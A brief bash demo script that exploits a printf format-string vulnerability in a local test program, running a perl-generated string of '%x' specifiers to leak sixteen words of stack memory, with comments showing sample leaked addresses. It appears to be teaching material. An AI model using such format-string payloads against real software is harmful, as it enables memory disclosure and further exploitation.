#!/bin/bash
# Exploit this printf format string vuln by trying this first:
# $ ./fmtstr_issue 0x%x
# 0x7ea3c294$
#
# $ ./fmtstr_issue 0x%x0x%x
# 0x7eea52940x7eea52a0$
# $
#
# Then:
# ./fmtstr_issue $(perl -e 'print "0x%x,"x16')
echo "Format string (vuln) demo: print 16 words of memory from the test process stack by running:
./fmtstr_issue $(perl -e 'print "0x%x,"x16')"
./fmtstr_issue $(perl -e 'print "0x%x,"x16')
